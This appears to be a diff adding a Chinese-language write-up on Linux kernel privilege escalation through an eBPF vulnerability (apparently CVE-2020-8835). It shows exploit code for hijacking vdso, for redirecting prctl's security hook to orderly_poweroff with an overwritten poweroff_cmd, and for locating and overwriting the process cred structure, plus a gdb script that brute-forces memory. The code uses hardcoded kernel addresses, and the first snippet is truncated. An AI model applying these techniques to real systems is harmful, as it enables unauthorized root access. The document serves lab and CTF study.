@@ -1,0 +1,89 @@
+    #include 
+    int main(){
+        int test;
+        size_t result=0;
+        unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
+        result=memmem(sysinfo_ehdr,0x1000,"gettimeofday",12);
+        printf("[+]VDSO : %p\n",sysinfo_ehdr);
+        printf("[+]The offset of gettimeofday is : %x\n",result-sysinfo_ehdr);
+        if (sysinfo_ehdr!=0){
+            for (int i=0x730;i
+### 劫持HijackPrctl
+除了劫持vdso,我们还可以利用劫持prctl函数使其最终运行到call_usermodehelper,并且自定义参数,达到在内核运行任意命令的目的,做到提权.
+##### prctl函数流程分析
+根据内核版本找到系统调用prctl的流程如下  
+我们看到prctl函数的参数原封不动的传到了security_task_prctl中,继续跟进,看到函数运行了`hp->hook.task_prctl`  
+分析完了prctl,接下来我们在/kernel/reboot.c中查看`__orderly_poweroff`函数  
+发现该函数的参数只有一个,且为布尔类型.最终运行了run_cmd(),而poweroff_cmd为全局变量
+我们可以将`hp->hook`地址指向的值改为orderly_poweroff,将变量,poweroff_cmd改为我们想要执行的命令,这样我们运行prctl()就等同于运行`__orderly_poweroff(any_command)`,而后者具有root权限
+我们首先使用gdb或者`more /proc/kallsyms`命令查看函数地址  
+通过任意地址写,修改变量poweroff_cmd和`hp->hook`地址,然后调用prctl,进行触发.代码如下
+    expbuf64[0] = 0x81090c90 -1;
+    bpf_update_elem(expmapfd,&key,expbuf,0xffffffff824b2240);       // security_task_prctl 改为 orderly_poweroff
+    expbuf64[0] = 0x6e69622f -1;
+    bpf_update_elem(expmapfd,&key,expbuf,0xffffffff824467c0);       //命令改为 chmod 777 /flag
+    expbuf64[0] = 0x6d68632f -1;
+    bpf_update_elem(expmapfd,&key,expbuf,0xffffffff824467c0+0x4);   //命令改为 chmod 777 /flag
+    expbuf64[0] = 0x3720646f -1;
+    bpf_update_elem(expmapfd,&key,expbuf,0xffffffff824467c0+0x8);   //命令改为 chmod 777 /flag
+    expbuf64[0] = 0x2f203737 -1;
+    bpf_update_elem(expmapfd,&key,expbuf,0xffffffff824467c0+0xc);   //命令改为 chmod 777 /flag
+    expbuf64[0] = 0x67616c66 -1;
+    bpf_update_elem(expmapfd,&key,expbuf,0xffffffff824467c0+0x10);   //命令改为 chmod 777 /flag
+    prctl(0,0);     //调用劫持的prctl,相当于运行__orderly_poweroff(bool force),而全局变量poweroff_cmd = 'chmod 777 /flag'
+再次使用gdb下断,查看$rb0x18,发现地址已经修改为orderly_poweroff  
+同时查看全局变量,已经修改为我们想要的结果  
+此时查看flag读写权限,发现该文件的权限已通过root权限进行了修改  
+至此提权效果演示完毕,完整的代码和运行环境见  
+### 根据comm查找cred结构
+相对于前两种”曲线”式的提权,查找cred结构进行提权显得比较直观,其原理就是在内核空间查找特定进程的cred结构体,
+首先我们对comm字段进行设置
+    char target[16];
+    strcpy(target,"aaaaaaaa");
+    prctl(PR_SET_NAME,target);              //通过prctl设置字符串为aaaaaaaa
+通过爆破0xffff880000000000~0xffffc80000000000的地址,查找该字段,从而确定该线程的cred结构体,再利用任意地址读写,修改cred结构体,进行权限的提升.
+我这里将代码稍作修改,查看comm字符串是否改变
+    uint64_t task_struct, cred, current_task, comm;
+        uint64_t per_cpu_offset = read_8byte(0xffffffff822c26c0);
+        printf("per_cpu_offset: 0x%lx\n", per_cpu_offset);
+        for(int i = 0; ; i++){
+            current_task = read_8byte(per_cpu_offset + 0x17d00);
+            comm = read_8byte(current_task + 0x648);
+            if(comm == 0x6161616161616161){                     //通过prctl设置的字符串判断位置
+                printf("current_task: 0x%lx\n", current_task);
+                task_struct = current_task;
+                printf("[+] comm: 0x%lx\n", comm); // get comm to check
+                hextostr(comm);
+                break;
+            }
+        }
+运行代码,发现comm地址已经成功被我们改写,之后再通过偏移找到cred结构,将其修改进行权限提升  
+##### 不成熟的小技巧
+这里出现了一个问题,就是在任意地址读函数最终是执行bpf_map_get_info_by_fd()进行任意地址读取  
+而爆破的过程中势必会运行到内核地址未分配的情况,每当程序运行到这里,就会造成’unable to handle page
+fault’,引起内核crash.程序无法继续.这里有一个小技巧:  
+我们qemu中的程序由于内核crash无法运行,但是这对于宿主机却并不影响,我们可以使用gdb脚本的方式,将爆破的工作交给gdb,gdb将输出的结果进行保存,待我们将保存的结果分析,得出一个更加精准的目标范围时,修改程序爆破范围,避免其出现crash的情况.这里我们以爆破vdso地址为例:
+首先将脚本保存在一个文件中
+    root@snappyjackPC:/home/cve-repo/0x04-pwn2own-ebpf-jmp32-cve-2020-8835# more bbb 
+    target remote :1234
+    x/s 0xffffffff80001000
+    x/s 0xffffffff80002000
+    x/s 0xffffffff80003000
+    x/s 0xffffffff80004000
+    x/s 0xffffffff80005000
+    …
+    …
+    …
+    x/s 0xffffffffffffb000
+    x/s 0xffffffffffffc000
+    x/s 0xffffffffffffd000
+    x/s 0xffffffffffffe000
+    x/s 0xfffffffffffff000
+将结果保存
+    gdb --batch --command=bbb > 8835_dump.txt
+搜索ELF字段(vdso整页映射,具有elf结构)  
+根据搜索的结果便可缩小我们要爆破的范围,防止程序crash
+代码及运行环境:
+### 参考文章
+其中关于ebpf模块的详细讲解:  
+[https://www.bilibili.com/video/BV1Bt411S7tg?from=search&seid=16841983597864343370](https://www.bilibili.com/video/BV1Bt411S7tg?from=search&seid=16841983597864343370)
